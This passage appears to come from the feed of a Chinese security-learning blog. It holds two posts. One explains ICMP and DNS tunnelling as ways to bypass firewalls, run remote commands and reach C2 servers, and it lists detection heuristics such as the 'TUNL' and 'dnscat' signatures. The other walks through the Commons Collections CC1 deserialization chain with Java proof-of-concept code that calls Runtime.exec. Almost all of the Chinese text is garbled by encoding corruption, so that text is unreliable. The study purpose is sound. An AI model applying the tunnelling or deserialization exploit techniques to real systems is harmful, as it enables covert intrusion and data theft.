é€’èµ·ç€é‡è¦çš„ä½œç”¨ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªæ£€æŸ¥ç½‘ç»œå¯ä¸å¯è¾¾çš„åè®®</p><p>åŸç†</p><p>ç”±äºICMPæŠ¥æ–‡è‡ªèº«å¯ä»¥æºå¸¦æ•°æ®ï¼Œè€Œä¸”ICMPæŠ¥æ–‡æ˜¯ç”±ç³»ç»Ÿå†…æ ¸å¤„ç†çš„ï¼Œä¸å ç”¨ä»»ä½•ç«¯å£ï¼Œå› æ­¤å…·æœ‰å¾ˆé«˜çš„éšè”½æ€§ã€‚</p><p>é€šå¸¸ICMPéš§é“æŠ€æœ¯é‡‡ç”¨ICMPçš„ICMP_ECHOå’ŒICMP_ECHOREPLYä¸¤ç§æŠ¥æ–‡ï¼ŒæŠŠæ•°æ®éšè—åœ¨ICMPæ•°æ®åŒ…åŒ…å¤´çš„é€‰é¡¹åŸŸä¸­ï¼Œåˆ©ç”¨pingå‘½ä»¤å»ºç«‹éšè”½é€šé“ã€‚</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/6a123b327b673db81ffb5ffb471e2cc.png"></p><p>è¿›è¡Œéšè”½ä¼ è¾“çš„æ—¶å€™ï¼Œè‚‰é¸¡(é˜²ç«å¢™å†…éƒ¨)è¿è¡Œå¹¶æ¥å—å¤–éƒ¨æ”»å‡»ç«¯çš„ICMP_ECHOæ•°æ®åŒ…ï¼Œæ”»å‡»ç«¯æŠŠéœ€è¦æ‰§è¡Œçš„å‘½ä»¤éšè—åœ¨ICMP_ECHOæ•°æ®åŒ…ä¸­ï¼Œè‚‰é¸¡æ¥æ”¶åˆ°è¯¥æ•°æ®åŒ…ï¼Œè§£å‡ºå…¶ä¸­éšè—çš„å‘½ä»¤ï¼Œå¹¶åœ¨é˜²ç«å¢™å†…éƒ¨ä¸»æœºä¸Šæ‰§è¡Œï¼Œå†æŠŠæ‰§è¡Œç»“æœéšè—åœ¨ICMP_ECHOREPLYæ•°æ®åŒ…ä¸­ï¼Œå‘é€ç»™å¤–éƒ¨æ”»å‡»ç«¯ã€‚</p><p>æ¯”å¦‚ï¼šæ”»å‡»è€…æŠŠæŒ‡ä»¤<code>whoami</code>è—åœ¨æ•°æ®åŒºï¼Œå‘åˆ°å†…ç½‘æœºå™¨ï¼Œå†…ç½‘æœºå™¨æ‰§è¡Œ<code>whoami</code>åï¼ŒæŠŠç»“æœè—åœ¨å›åº”çš„ICMPåŒ…é‡Œå‘å›å»</p><h3 id="ICMPéš§é“èƒ½å¹²å•¥ï¼Ÿ"><a href="#ICMPéš§é“èƒ½å¹²å•¥ï¼Ÿ" class="headerlink" title="ICMPéš§é“èƒ½å¹²å•¥ï¼Ÿ"></a><strong>ICMPéš§é“èƒ½å¹²å•¥ï¼Ÿ</strong></h3><p><strong>ç»•è¿‡é˜²ç«å¢™</strong>ï¼š</p><p>å†…ç½‘æœºå™¨è¢«é™åˆ¶åªèƒ½<code>ping</code>å¤–ç½‘ï¼Œä½†é€šè¿‡ICMPéš§é“å¯ä»¥å·å·ä¼ æ–‡ä»¶æˆ–è¿œç¨‹æ§åˆ¶</p><ul><li><em>ä¾‹å­ï¼šå…¬å¸å†…ç½‘ç¦æ­¢SSHï¼Œä½†å…è®¸<code>ping</code>ï¼Œå‘˜å·¥ç”¨ICMPéš§é“ä¼ æ•æ„Ÿæ–‡ä»¶ã€‚</em></li></ul><p><strong>åå¼¹Shell</strong></p><p>æ”»å‡»è€…é€šè¿‡ICMPåŒ…å‘å—å®³æœºå™¨å‘é€æŒ‡ä»¤ï¼Œå—å®³æœºå™¨æ‰§è¡Œåé€šè¿‡ICMPåŒ…è¿”å›ç»“æœï¼Œå®ç°è¿œç¨‹æ§åˆ¶</p><p><strong>å†…ç½‘ç©¿é€</strong></p><p>å†…ç½‘ä¸»æœºé€šè¿‡ICMPéš§é“å°†æµé‡è½¬å‘åˆ°å…¬ç½‘ä»£ç†ï¼Œå®ç°è®¿é—®å¤–ç½‘èµ„æºï¼ˆç±»ä¼¼æ—©å¹´å…è´¹ä¸Šç½‘çš„â€œé»‘ç§‘æŠ€â€ï¼‰</p><h3 id="ä¸‰ã€ICMPéš§é“çš„ä¼˜ç¼ºç‚¹"><a href="#ä¸‰ã€ICMPéš§é“çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¸‰ã€ICMPéš§é“çš„ä¼˜ç¼ºç‚¹"></a><strong>ä¸‰ã€ICMPéš§é“çš„ä¼˜ç¼ºç‚¹</strong></h3><h4 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a><strong>ä¼˜ç‚¹</strong></h4><p><strong>éšè”½æ€§å¼º</strong>ï¼šæ•°æ®è—åœ¨<code>ping</code>åŒ…é‡Œï¼Œé˜²ç«å¢™ä¸€èˆ¬ä¸ç®¡</p><p><strong>æ— éœ€ç«¯å£</strong>ï¼šç›´æ¥åˆ©ç”¨ç³»ç»Ÿå†…æ ¸å¤„ç†ICMPåè®®ï¼Œä¸ä¾èµ–ç‰¹å®šç«¯å£</p><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a><strong>ç¼ºç‚¹</strong></h4><p><strong>é€Ÿåº¦æ…¢</strong>ï¼šICMPåŒ…é»˜è®¤æ•°æ®é‡å°ï¼ˆWindows 32å­—èŠ‚ã€Linux 48å­—èŠ‚ï¼‰ï¼Œå¤§æ–‡ä»¶ä¼ è¾“åƒèš‚èšæ¬å®¶</p><p><strong>ä¸ç¨³å®š</strong>ï¼šICMPæ˜¯æ— è¿æ¥åè®®ï¼Œå®¹æ˜“ä¸¢åŒ…ï¼Œé€‚åˆä¼ å°æŒ‡ä»¤ï¼Œä¸é€‚åˆé«˜æ¸…è§†é¢‘</p><p><strong>æƒé™è¦æ±‚é«˜</strong>ï¼šä¿®æ”¹ICMPæ•°æ®éœ€è¦ç®¡ç†å‘˜æƒé™ï¼ˆæ™®é€šç”¨æˆ·ç©ä¸è½¬ï¼‰</p><h3 id="æ£€æµ‹"><a href="#æ£€æµ‹" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h3><ul><li><p>æ£€æµ‹åŒä¸€æ¥æº ICMP æ•°æ®åŒ…çš„æ•°é‡ã€‚ä¸€ä¸ªæ­£å¸¸çš„ ping æ¯ç§’æœ€å¤šåªä¼šå‘é€ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œè€Œä½¿ç”¨ ICMPéš§é“çš„æµè§ˆå™¨åœ¨åŒä¸€æ—¶é—´ä¼šäº§ç”Ÿä¸Šåƒä¸ª ICMP æ•°æ®åŒ…ã€‚</p></li><li><p>å¯»æ‰¾é‚£äº›å“åº”æ•°æ®åŒ…ä¸­ payload è·Ÿè¯·æ±‚æ•°æ®åŒ…ä¸ä¸€è‡´çš„ ICMP æ•°æ®åŒ…ã€‚</p></li><li><p>æ³¨æ„é‚£äº› ICMP æ•°æ®åŒ…ä¸­ payload å¤§äº 64 æ¯”ç‰¹çš„æ•°æ®åŒ…ã€‚å½“ç„¶ icmptunnel å¯ä»¥é…ç½®é™åˆ¶æ‰€æœ‰æ•°æ®åŒ…çš„ payload ä¸º 64 æ¯”ç‰¹ï¼Œè¿™æ ·ä¼šä½¿å¾—æ›´éš¾ä»¥è¢«æ£€æµ‹åˆ°ã€‚</p></li><li><p>æ£€æŸ¥ICMPæ•°æ®åŒ…çš„åè®®æ ‡ç­¾ï¼Œä¾‹å¦‚icmptunnel ä¼šåœ¨æ‰€æœ‰çš„ ICMPpayload å‰é¢å¢åŠ  â€˜TUNLâ€™ æ ‡è®°ä»¥ç”¨äºè¯†åˆ«éš§é“ï¼Œè¿™å°±æ˜¯ç‰¹å¾ã€‚</p></li></ul><h1 id="å…è®¸ç‰¹å®šçš„TCPæˆ–UDPåè®®ç«¯å£å‡ºç½‘"><a href="#å…è®¸ç‰¹å®šçš„TCPæˆ–UDPåè®®ç«¯å£å‡ºç½‘" class="headerlink" title="å…è®¸ç‰¹å®šçš„TCPæˆ–UDPåè®®ç«¯å£å‡ºç½‘"></a>å…è®¸ç‰¹å®šçš„TCPæˆ–UDPåè®®ç«¯å£å‡ºç½‘</h1><p>ç»œé˜²ç«å¢™å…è®¸ç‰¹å®šçš„TCPæˆ–è€…UDPç«¯å£å‡ºç½‘ï¼Œæ¯”å¦‚è¿æ¥å¤–ç½‘çš„22ã€53ã€80ã€443ã€3389ç­‰å¸¸è§åº”ç”¨çš„é»˜è®¤ç›‘å¬ç«¯å£ã€‚</p><p>åœ¨ä¸€ä¸ªä¸èƒ½å‡ºç½‘çš„ç½‘ç»œç¯å¢ƒé‡Œé¢ï¼Œå°†æ‰€æœ‰çš„TCPå’ŒUPDç«¯å£éƒ½æ¢æµ‹ä¸€éï¼Œé€šå¸¸éƒ½èƒ½å‘ç°æœ‰ä¸€ä¸¤ä¸ªå¸¸è§çš„ç«¯å£èƒ½å‡ºç½‘ã€‚è¿™é€šå¸¸æ˜¯ç”±äºç½‘ç»œç®¡ç†å‘˜çš„é”™è¯¯é…ç½®å’Œå·æ‡’è¡Œä¸ºå¯¼è‡´ï¼š</p><p>æ¯”å¦‚é…ç½®çš„é˜²ç«å¢™è§„åˆ™å‰åçŸ›ç›¾ï¼Œè§£æçš„æ—¶å€™é‡åˆ°åŒ¹é…è§„åˆ™å°±é€€å‡ºæ‰§è¡Œ<br>æ¯”å¦‚ç½‘ç»œç®¡ç†å‘˜é…ç½®å…è®¸webæœåŠ¡å™¨è®¿é—®å¦ä¸€å­ç½‘çš„mysqlæ•°æ®åº“çš„3306ç«¯å£ã€‚ç½‘ç»œç®¡ç†å‘˜é…ç½®æ—¶å·æ‡’ï¼Œå¯èƒ½ä¼šç›´æ¥æ”¾è¡ŒwebæœåŠ¡å™¨åˆ°ä»»æ„ipåœ°å€çš„3306ç«¯å£</p><h1 id="DNSéš§é“"><a href="#DNSéš§é“" class="headerlink" title="DNSéš§é“"></a>DNSéš§é“</h1><h5 id="å…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘ï¼ˆæ¯”å¦‚HTTPã€SSHã€DNSç­‰åº”ç”¨å±‚åè®®ï¼‰"><a href="#å…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘ï¼ˆæ¯”å¦‚HTTPã€SSHã€DNSç­‰åº”ç”¨å±‚åè®®ï¼‰" class="headerlink" title="å…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘ï¼ˆæ¯”å¦‚HTTPã€SSHã€DNSç­‰åº”ç”¨å±‚åè®®ï¼‰"></a>å…è®¸ç‰¹å®šçš„åº”ç”¨å±‚åè®®å‡ºç½‘ï¼ˆæ¯”å¦‚HTTPã€SSHã€DNSç­‰åº”ç”¨å±‚åè®®ï¼‰</h5><p>è¿™ç§ç½‘ç»œé˜²ç«å¢™èƒ½è¯†åˆ«åº”ç”¨å±‚çš„åè®®ï¼Œæ”¾è¡Œå…è®¸å‡ºç½‘çš„åè®®ï¼Œæ¯”å¦‚HTTPã€SSHã€DNSã€RDPç­‰åº”ç”¨å±‚åè®®</p><p>åŸç†</p><p>ç«¯å£ä¸å’ŒæœåŠ¡ç»‘å®šï¼Œå¯ä»¥ä¼ è¾“ä»»ä½•æ•°æ®ã€‚</p><p>è¯¦ç»†èŠèŠè¿™æ®µæ–‡å­— ç«¯å£ä¸å’ŒæœåŠ¡ç»‘å®šæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œæ„æ€å°±æ˜¯DNSçš„53å·ç«¯å£å®ƒå¦‚æœåªèƒ½ä¼ é€’å¸¦æœ‰DNSå¤´çš„æ•°æ®åŒ…çš„æµé‡è¿™ä¸ªå°±å«åšç«¯å£å’ŒæœåŠ¡è¿›è¡Œç»‘å®šä½†æ˜¯DNSç«¯å£å¯ä»¥ä¼ è¾“æ–‡ä»¶ï¼ŒæŒ‡ä»¤ç”šè‡³å¯ä»¥ä¼ è¾“ç”µå½± è¿™ä¸ªæ„æ€å°±æ˜¯ç«¯å£å’ŒæœåŠ¡æ²¡æœ‰è¿›è¡Œç»‘å®š è¿™å°±é€ æˆäº†æˆ‘ä»¬å¯¹DNSéš§é“çš„ä¸€ä¸ªåˆ©ç”¨</p><p>C&amp;CæœåŠ¡å™¨åœ¨å»ºç«‹è¿æ¥åå°†æŒ‡ä»¤ä¼ é€’ç»™å®¢æˆ·ç«¯ä¸Šçš„åé—¨ç¨‹åºã€‚</p><p>å®¢æˆ·ç«¯åé—¨ç¨‹åºè¿›è¡ŒDNSæŸ¥è¯¢æ—¶ï¼Œå¦‚æœæŸ¥è¯¢çš„åŸŸåä¸åœ¨DNSæœåŠ¡å™¨æœ¬æœºçš„ç¼“å­˜ä¸­ï¼Œå°±ä¼šè®¿é—®äº’è”ç½‘è¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åè¿”å›ç»“æœï¼Œå¦‚æœäº’è”ç½‘ä¸Šæœ‰ä¸€å°æ”»å‡»è€…è®¾ç½®çš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±å¯ä»¥ä¾é åŸŸåè§£æçš„å“åº”è¿›è¡Œæ•°æ®åŒ…çš„äº¤æ¢ï¼Œä»DNSåè®®çš„è§’åº¦æ¥çœ‹ï¼Œè¿™æ ·çš„æ“ä½œåªæ˜¯åå¤æŸ¥è¯¢æŸä¸ªæˆ–è€…æŸäº›ç‰¹å®šçš„åŸŸåå¹¶ä¸”å¾—åˆ°è§£æç»“æœï¼Œä½†å…¶æœ¬è´¨æ˜¯ï¼ŒDNSé¢„æœŸçš„è¿”å›ç»“æœåº”è¯¥æ˜¯ä¸€ä¸ªIPåœ°å€ï¼Œè€Œäº‹å®ä¸Šè¿”å›çš„å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬åŠ å¯†çš„C&amp;CæŒ‡ä»¤ï¼Œä»è€Œå°†å…¶ä»–åè®®å°è£…åœ¨DNSåè®®ä¸­è¿›è¡Œä¼ è¾“ã€‚<br>DNSéš§é“ï¼ˆç›´è”å‹ï¼‰æœ¨é©¬çš„é€šä¿¡ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/c35866a915140c30a95b310e6f3fe54.png"></p><p>ç›´è¿ä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯ç›´æ¥å’ŒæŒ‡å®šçš„ç›®æ ‡DNS Server(Authoritative NS Server)è¿æ¥ï¼Œé€šè¿‡å°†æ•°æ®ç¼–ç å°è£…åœ¨DNSåè®®ä¸­è¿›è¡Œé€šä¿¡ï¼Œè¿™ç§æ–¹å¼é€Ÿåº¦æ›´å¿«ï¼Œä½†æ˜¯éšè”½æ€§è¾ƒå·®ï¼Œå®¹æ˜“è¢«WAFæˆ–è€…IDSè®¾å¤‡æ¢æµ‹åˆ°ï¼Œå¦å¤–é™åˆ¶æ¯”è¾ƒé«˜ï¼Œå¾ˆå¤šå®é™…åœºæ™¯ä¸‹ä¸å…è®¸æ”»å‡»è€…æ¥è‡ªå®šä¹‰DNS Serverï¼Œå¦åˆ™å¾ˆå®¹æ˜“è¢«å‘ç°ã€‚</p><p>åä¸­ç»§å‹ï¼š</p><p>é€šè¿‡DNSé€’å½’æŸ¥è¯¢å®ç°çš„ä¸­ç»§éš§é“ï¼Œæ¯”è¾ƒéšè”½ï¼Œä½†åŒæ—¶å› ä¸ºæ•°æ®åŒ…åˆ°è¾¾ç›®æ ‡DNS Serverå‰éœ€è¦ç»è¿‡å¤šä¸ªèŠ‚ç‚¹ï¼Œæ‰€ä»¥é€Ÿåº¦ä¸Šè¾ƒç›´è¿æ…¢å¾ˆå¤š(å…¶å®å°±ç±»ä¼¼ä¼ªé€ ä¸€å°ç§æœ‰DNS Serverï¼Œå½“ç„¶ä¹Ÿè®¸å¤§ä½¬ç¥ä»™ä»¬çœŸæœ‰ä¸€å°æƒå¨DNS Serverä¹Ÿè¯´ä¸ä¸€å®šå“ˆ)ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦è§„é¿æœ¬åœ°å®¢æˆ·ç«¯çš„DNSç¼“å­˜ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨éšæœºåŸŸåç”Ÿæˆç®—æ³•ï¼ˆDGAï¼‰ã€‚å¾ˆå¤šæ¶æ„è½¯ä»¶åˆ©ç”¨è¯¥ç®—æ³•ç”ŸæˆéšæœºåŸŸåï¼Œæœ‰æ•ˆç»•è¿‡é»‘åå•æ£€æµ‹ï¼Œé€šè¿‡è½®è¯¢çš„æ–¹å¼å°è¯•è¿æ¥ï¼Œå¯»æ‰¾C2æ§åˆ¶ä¸­å¿ƒã€‚ï¼ˆDGAç®—æ³•çš„æ£€æµ‹æµ‹æ–¹æ³•ä¹Ÿæœ‰ä¸å°‘ï¼Œè¿™é‡ŒæŒ‰ä¸‹ä¸è¡¨ï¼‰<br><img src="C:\Users\GuoFen\AppData\Roaming\Typora\typora-user-images\image-20250321154330405.png" alt="image-20250321154330405"></p><p>â‘ å—åˆ°æœ¨é©¬æ§åˆ¶çš„PCå°†æ•°æ®å°è£…åˆ°DNSæ•°æ®æŠ¥æ–‡é‡Œï¼Œå‘ä½äºå†…ç½‘çš„æœ¬åœ°åŸŸåæœåŠ¡å™¨è¯·æ±‚æŸ¥è¯¢baidu.com</p><p>â‘¡æœ¬åœ°åŸŸåæœåŠ¡å™¨é€è¿‡é˜²ç«å¢™å‘æ ¹åŸŸåæœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚</p><p>â‘¢ç»è¿‡å¤§é‡çš„é€’å½’é‡å®šå‘ï¼ŒæŸ¥è¯¢è¯·æ±‚å‘åˆ°baidu.comçš„ï¼ˆä¼ªé€ ï¼‰æƒå¨åŸŸåæœåŠ¡å™¨</p><p>â‘£baidu.comï¼ˆä¼ªé€ ï¼‰æƒå¨åŸŸåæœåŠ¡å™¨æ˜¯åœ¨æ”»å‡»è€…æ§åˆ¶ä¸‹ï¼Œè§£æå¹¶å‘é€å“åº”åŒ…</p><p>â‘¤dnså“åº”åŒ…ç©¿é€å†…ç½‘é˜²ç«å¢™</p><p>â‘¥è¿›å…¥å†…ç½‘</p><p>â‘¦æœ¬åœ°åŸŸåæœåŠ¡å™¨å°†å“åº”åŒ…è¿”å›ç»™å—æ§å®¢æˆ·ç«¯æ£€æµ‹ï¼š</p><p>ç¼ºç‚¹ï¼š</p><ul><li><strong>é€Ÿåº¦æ…¢</strong>ï¼šDNSæŸ¥è¯¢éœ€è¦æ¥å›å¤šæ¬¡ï¼Œä¼ å¤§æ–‡ä»¶ä¼šæ€¥æ­»äººã€‚</li><li><strong>å¯èƒ½è¢«æ£€æµ‹</strong>ï¼šé˜²ç«å¢™å‘ç°å¤§é‡å¼‚å¸¸DNSè¯·æ±‚ä¼šæŠ¥è­¦ã€‚</li><li><strong>éœ€è¦è‡ªå»ºNSæœåŠ¡å™¨</strong>ï¼šå¾—æœ‰ä¸ªæœåŠ¡å™¨éšæ—¶å¾…å‘½å¤„ç†æŸ¥è¯¢ã€‚</li></ul><h3 id="æ£€æµ‹-1"><a href="#æ£€æµ‹-1" class="headerlink" title="æ£€æµ‹"></a>æ£€æµ‹</h3><ul><li>æ¯ä¸ªIPåœ°å€çš„DNSæµé‡å¼‚å¸¸ï¼ŒDNSæŠ¥æ–‡æ•°é‡å¤§</li><li>DNSæ¶ˆæ¯ä¸­TXTæˆ–NULLç­‰ä¸å¸¸ç”¨çš„è®°å½•ç±»å‹å¤š</li><li>DNSæ¶ˆæ¯ä¸­åŸŸåæœ‰éƒ¨åˆ†å›ºå®šä¸å˜</li><li>DNSæœåŠ¡å™¨çš„åœ°ç†ä½ç½®å¼‚å¸¸</li><li>è®¿é—®éå—ä¿¡çš„DNSæœåŠ¡å™¨</li><li>åŸºäºè¯·æ±‚åŸŸåé•¿åº¦åŠè¯·æ±‚é¢‘ç‡ç»Ÿè®¡åˆ†ææ–¹æ³•</li><li>dnscat æŸ¥è¯¢ä¸­åŒ…å«äº†dnscat å­—ç¬¦ä¸²</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å­¦ä¹ ä¸€ä¸‹ç½‘ç»œçŸ¥è¯†&lt;/p&gt;
&lt;p&gt;ä¸»è¦å­¦ä¹ ä¸‹DNS,å› ä¸ºåœ¨åç»­çš„å†…ç½‘æ¸—é€ä¸åº”æ€¥æ„Ÿè§‰ç”¨çš„ä¼šæ¯”è¾ƒå¤š&lt;/p&gt;
&lt;p&gt;DNSè§£ææµç¨‹æœ‰ä¸ªå¤§è‡´çš„äº†è§£ è¿™é‡Œå°±ä¸ä¸€ä¸€ç»†è°ˆäº†ä¸»è¦è¿˜æ˜¯å­¦ä¹ ä¸€ä¸‹åŸŸåè§£æè®°å½•&lt;/p&gt;
&lt;h2 id=&quot;åŸŸåè§£æè®°å½•&quot;&gt;&lt;a href=&quot;#åŸŸåè§£æè®°å½•&quot; class=</summary>
      
    
    
    
    <category term="network" scheme="https://gu0f3n.github.io/categories/network/"/>
    
    
    <category term="network" scheme="https://gu0f3n.github.io/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>cc1åˆ†æ</title>
    <link href="https://gu0f3n.github.io/2025/03/19/cc1%E5%88%86%E6%9E%90/"/>
    <id>https://gu0f3n.github.io/2025/03/19/cc1%E5%88%86%E6%9E%90/</id>
    <published>2025-03-19T11:48:51.000Z</published>
    <updated>2025-03-20T10:13:17.967Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>ç¯å¢ƒæ­å»ºä¸è¯´äº† ç½‘ä¸Šå¾ˆå¤šä¼˜ç§€çš„æ–‡ç« æ•™å­¦</p><p>å…ˆåˆ—å‡ºåˆ©ç”¨çš„é“¾å­ç„¶åæˆ‘ä»¬éœ€è¦å€’ç€è¿›è¡Œåˆ†æ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()--&gt;</span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue()--&gt;</span><br><span class="line">TransformedMap.checkSetValue()--&gt;</span><br><span class="line">ChainedTransformer.transform()--&gt;</span><br><span class="line">InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p>CC1é“¾çš„<strong>æœ«å°¾</strong>ï¼ˆå…¥å£&#x2F;æºå¤´ï¼‰å°±æ˜¯Commons Collectionsåº“ä¸­çš„<code>Tranformer</code>æ¥å£ï¼Œè¿™ä¸ªæ¥å£é‡Œé¢æœ‰ä¸ª<code>transform</code>æ–¹æ³•ã€‚</p><p><strong>InvokerTransformer</strong></p><p>æ‰¾åˆ°è¿™ä¸ªç±»å‘ç°å®ç°äº†Tranformeræ¥å£çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//å®šä¹‰äº†ä¸€ä¸ªè¿”å›ç±»å‹æ˜¯objectçš„å…¬å…±æ–¹æ³•ä¸”æ¥å—çš„å‚æ•°æ˜¯ä¸€ä¸ªinputçš„Object</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;<span class="comment">//æ£€æŸ¥ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸ºnull,ä¸ºnullç›´æ¥è¿”å›null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//åå°„è·å– input å¯¹è±¡çš„ Class å¯¹è±¡ã€‚</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//ä» cls è¡¨ç¤ºçš„ç±»ä¸­æŸ¥æ‰¾ä¸€ä¸ªå…¬å…±æ–¹æ³•ï¼Œå¹¶è¿”å›å¯¹åº”çš„ Method å¯¹è±¡ã€‚</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//è°ƒç”¨ method è¡¨ç¤ºçš„æ–¹æ³•ï¼Œå¹¶è¿”å›å…¶ç»“æœ</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç  ä»£ç ä¸å¥½å»ºè®®é€å¥åˆ†æè¿™é‡Œç›´æ¥æ”¾åˆ°æ³¨é‡Šé‡Œé¢</p><p>è¿™å°±å®Œå…¨ç¬¦åˆååºåˆ—åŒ–çš„å‚æ•°å¯æ§å¯ä»¥ç›´æ¥è¿›è¡Œåˆ©ç”¨ï¼Œå‚æ•°å¯æ§å°±å¯¼è‡´äº†<strong>åå°„è°ƒç”¨ä»»æ„ç±» ä»»æ„æ–¹æ³•</strong>ã€‚</p><p>è¿›è¡Œåˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">//æ­£å¸¸ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//ä½¿ç”¨åå°„ è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">//Class clazz = Runtime.class;</span></span><br><span class="line">        <span class="comment">//Method cmdMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//cmdMethod.invoke(cmd, &quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//InvokerTransformerç±» è°ƒç”¨å¯å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);<span class="comment">//ç»™InvokerTransformeré‡Œçš„å‚æ•°èµ‹å€¼ï¼Œç„¶åè°ƒç”¨transformï¼ˆcmdï¼‰ï¼Œæœ€ç»ˆå®ä¹ åœ¨cmdä¸Šå®ç°Runtime.getRuntime().exec(&quot;calc&quot;)</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250319202058.png"></p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>çŸ¥é“äº†<code>InvokerTransformer</code>ç±»å¯ä»¥è°ƒç”¨<code>transform()</code>æ–¹æ³•æ‰§è¡Œå‘½ä»¤ï¼Œé‚£æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯å¯»æ‰¾è¿˜æœ‰å…¶ä»–ä»€ä¹ˆåœ°æ–¹è°ƒç”¨äº†<code>InvokerTransformer</code>ç±»çš„<code>transform()</code>æ–¹æ³•ã€‚</p><p>å¯ä»¥çœ‹åˆ°åœ¨TransformedMapè¿™ä¸ªç±»ä¸‹é¢çš„checkSetValueæ–¹æ³•è°ƒç”¨äº†ä»valueTransformer.transform</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320133956.png"></p><p>å¾€ä¸Šæ‰¾valueTransformer </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç° keyTransformerï¼ŒvalueTransformer å‚æ•°å¯æ§ 